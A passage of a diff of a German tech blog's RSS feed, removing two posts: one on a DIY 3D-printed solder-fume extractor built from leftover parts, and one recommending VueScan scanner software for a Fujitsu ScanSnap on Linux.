-					<comments>https://www.kernel-error.de/2024/11/09/loetdampfabsaugung-aus-resten/#respond</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Sat, 09 Nov 2024 16:55:16 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[3D Druck]]></category>
-		<category><![CDATA[DIY]]></category>
-		<category><![CDATA[Lötabsaugung]]></category>
-		<category><![CDATA[Lötrauchabsaugung]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=2702</guid>
-
-					<description><![CDATA[Heute mal etwas ganz Einfaches… Beim Löten entstehen Dämpfe, die man besser nicht durch den „Lungenfilter“ aus der Luft ziehen sollte. Hier kommen Lötdampfabsaugung ins Spiel. Es gibt kleine, einfache Modelle für etwa 50 €, die wie ein kleiner Tischventilator in der Nähe stehen, die Dämpfe absaugen und meist durch einen Aktivkohlefilter leiten. Allerdings stehen [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Heute mal etwas ganz Einfaches… Beim Löten entstehen Dämpfe, die man besser nicht durch den „Lungenfilter“ aus der Luft ziehen sollte.</p>
-
-
-<div class="wp-block-image">
-<figure class="alignleft size-large is-resized"><img loading="lazy" decoding="async" width="768" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-3-768x1024.jpg" alt="3D-gedruckte Lötdampfabsaugung" class="wp-image-2708" style="width:49px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-3-768x1024.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-3-225x300.jpg 225w, https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-3-1152x1536.jpg 1152w, https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-3-1536x2048.jpg 1536w, https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-3-676x901.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-3-scaled.jpg 1920w" sizes="auto, (max-width: 768px) 100vw, 768px" /></figure></div>
-
-
-<p>Hier kommen Lötdampfabsaugung ins Spiel. Es gibt kleine, einfache Modelle für etwa 50 €, die <a href="https://s.click.aliexpress.com/e/_DBqspEl" target="_blank" rel="noreferrer noopener">wie ein kleiner Tischventilator</a> in der Nähe stehen, die Dämpfe absaugen und meist durch einen Aktivkohlefilter leiten. Allerdings stehen mir diese Geräte immer im Weg, und die Lüfter sind oft so schwach, dass trotzdem noch ein großer Teil der Dämpfe zu mir gelangt.</p>
-
-
-
-<p>Dann gibt es noch <a href="https://s.click.aliexpress.com/e/_DCGd8Sv" target="_blank" rel="noreferrer noopener">Absaugungen mit mehr oder weniger flexiblem Schlauch</a>. Auch hier erfolgt die Filterung ähnlich, aber diese Modelle kosten dann schnell ein paar Hundert Euro.</p>
-
-
-
-<p>Da bei Projekten öfter mal Reste übrig bleiben, liegen in meinem Keller eigentlich schon alle Einzelteile für eine selbstgebaute Lötdampfabsaugung bereit. Man müsste sie nur noch zusammenbauen.</p>
-
-
-
-<p>Ich habe noch einen 100-mm-Lüftungsschlauch aus Aluminium, der einigermaßen flexibel ist, einen 120-mm-12V-Lüfter, der für ordentlich Luftstrom sorgt, und ein paar 130-mm-Aktivkohlefilterplatten. Wenn ich davon einfach zwei doppelt nehme, geht mehr als genug Luft durch, und sie filtern die Dämpfe recht gut.</p>
-
-
-
-<p>Mit FreeCAD habe ich dann ein Gehäuse für die Teile entworfen, das ich einfach unter meine Werkbank schrauben kann. So liegt nur der Schlauch in einer Ecke und kann bei Bedarf zur richtigen Stelle bewegt werden, um die Löt-Dämpfe direkt an der Quelle abzusaugen.</p>
-
-
-
-<p>Hier ein paar Bilder für euch – die Druckdateien findet ihr bei <a href="https://makerworld.com/en/models/772111" target="_blank" rel="noreferrer noopener">Maker World</a>.</p>
-
-
-
-<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2024/11/Loetgasabsaugung-5-676x507-640x480.jpg" title="Loetgasabsaugung-5" alt="3D-gedruckte Lötdampfabsaugung" /></div></div>
-
-
-
-<p>Ob die Teile auch zu euren „Resten“ passen, müsst ihr selbst kurz prüfen.</p>
-
-
-
-<p>Oh, <a href="https://amzn.to/40Fcd2X" target="_blank" rel="noreferrer noopener">Schlauch</a> und <a href="https://amzn.to/3O1oJm8" target="_blank" rel="noreferrer noopener">Filter</a> findet ihr bei Amazon.</p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2024/11/09/loetdampfabsaugung-aus-resten/feed/</wfw:commentRss>
-			<slash:comments>0</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>VueScan: Beste Scannersoftware für alte und vielseitige Scanner​</title>
-		<link>https://www.kernel-error.de/2024/10/29/empfehlung-der-scannersoftware-vuescan/</link>
-					<comments>https://www.kernel-error.de/2024/10/29/empfehlung-der-scannersoftware-vuescan/#respond</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Tue, 29 Oct 2024 12:08:50 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[Empfehlung]]></category>
-		<category><![CDATA[Fujitsu]]></category>
-		<category><![CDATA[OCR]]></category>
-		<category><![CDATA[PDF]]></category>
-		<category><![CDATA[S1500]]></category>
-		<category><![CDATA[Scanner]]></category>
-		<category><![CDATA[Scannersoftware]]></category>
-		<category><![CDATA[ScanSnap]]></category>
-		<category><![CDATA[Texterkennung]]></category>
-		<category><![CDATA[VueScan]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=2688</guid>
-
-					<description><![CDATA[Einen guten Dokumentenscanner zu finden, der auch noch bezahlbar ist, kann schnell zu einer Herausforderung werden. Viele ältere Geräte verlieren nach kurzer Zeit den Support für das nächste Betriebssystem und funktionieren dann nicht mehr. Wenn der Scanner zusätzlich unter Linux reibungslos laufen soll, wird es noch spannender. Vor vielen Jahren konnte ich mir günstig einen [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Einen guten Dokumentenscanner zu finden, der auch noch bezahlbar ist, kann schnell zu einer Herausforderung werden. Viele ältere Geräte verlieren nach kurzer Zeit den Support für das nächste Betriebssystem und funktionieren dann nicht mehr. Wenn der Scanner zusätzlich unter Linux reibungslos laufen soll, wird es noch spannender.</p>
-
-
-
-<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2024/10/Fujitsu-ScanSnap-S1500-1-640x480.jpg" title="Fujitsu-ScanSnap-S1500" alt="Bilder des Fujitsu ScanSnap S1500 Scanners" /></div></div>
-
-
-
-<p>Vor vielen Jahren konnte ich mir günstig einen Fujitsu ScanSnap S1500 zulegen. Dieser Dokumentenscanner erfüllt genau meine Anforderungen: Er zieht mehrere Seiten über den automatischen Dokumenteneinzug (ADF) ein, scannt beidseitig, ist schnell und liefert eine gute Auflösung. Wenn ich ihn nicht brauche, lässt er sich genauso schnell zusammenklappen, wie er sich aufstellen lässt, und nimmt kaum Platz auf meinem ohnehin schon überladenen Schreibtisch ein. Ich nutze den Scanner, um meine Post, Rechnungen und andere wichtige Unterlagen zu digitalisieren. Anfangs lief dies noch über eine Windows-VM, da es lange keine wirklich einfache Software für Linux gab, die auf Knopfdruck Dokumente scannt, Texterkennung (OCR) anwendet und alles als durchsuchbares PDF abspeichert. Dieses PDF wandert dann automatisch in meine Nextcloud und hilft mir, Ordnung in meinen Unterlagen zu halten.</p>
-
-
-
-<p>Vor etwa anderthalb Jahren stieß ich auf die Software <a href="https://www.hamrick.com/">VueScan</a>. Zwar kostet sie etwas, aber für mich ist sie jeden Cent wert. Sie läuft nativ oder als <a href="https://flathub.org/apps/com.hamrick.VueScan">Flatpak</a> auf meinem Linux-System, bietet mehr Funktionen, als ich tatsächlich benötige, und unterstützt eine beeindruckend große Anzahl an Scannern. Sie scannt sogar mein Netzwerk nach anderen Geräten – so läuft auch mein Samsung-Multifunktionsdrucker problemlos damit. Was mich jedoch wirklich beeindruckt, sind die Menschen hinter der Software.</p>
-
-
-
-<p>Soweit ich weiß, wird <a href="https://www.hamrick.com/">VueScan</a> nur von zwei Leuten entwickelt. Sie reagieren extrem schnell auf E-Mail-Anfragen und bieten hervorragenden Support. Gestern ist die Anwendung zum ersten Mal abgestürzt. Ich konnte sie direkt wieder öffnen, und alles war in Ordnung. Da <a href="https://www.hamrick.com/" data-type="link" data-id="https://www.hamrick.com/">VueScan</a> den Absturz jedoch selbst erkannte, öffnete sich sofort ein Dialog für einen Fehlerbericht. Das kennt man ja. Ich füllte den Bericht aus und schickte ihn ab – und heute hatte ich bereits eine E-Mail vom Entwickler im Postfach, der mir Unterstützung anbot und weitere Fragen zum Absturz stellte. Diese schnelle, persönliche Reaktion hat mich sehr positiv überrascht.</p>
-
-
-
-<p>Klar, mir war bereits aufgefallen, dass <a href="https://www.hamrick.com/">VueScan</a> sehr häufig und regelmäßig Updates erhält, aber dass der Entwickler so engagiert dahintersteht, beeindruckt mich wirklich. Das gibt mir ein gutes Gefühl. Die Software ist klasse, der Preis ist in Ordnung (ich habe die Professional-Version), und der Support sowie die Reaktionszeit sind erstklassig. Außerdem unterstützen sie gefühlt jeden Scanner auf diesem Planeten. Und ja, die Software gibt es natürlich auch für Windows und Mac. <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
-
-
-
-<p>Ich muss also nur einmal lernen, wie eine Software funktioniert, und bin dann in der Lage, auf verschiedenen Betriebssystemen und mit verschiedenen Geräten zu arbeiten. Ich möchte ja nicht Experte für x verschiedene Softwarelösungen werden, sondern einfach nur schnell meine Dokumente digitalisieren.</p>
-
-
-
-<p>Ich bekomme für diesen Beitrag keinerlei Vergütung oder Ähnliches – ich bin einfach wirklich überzeugt von VueScan. Probiert es doch einfach mal aus, und ich bin gespannt, ob ihr meine Meinung teilt.</p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2024/10/29/empfehlung-der-scannersoftware-vuescan/feed/</wfw:commentRss>
-			<slash:comments>0</slash:comments>
 		
 		
 			</item>
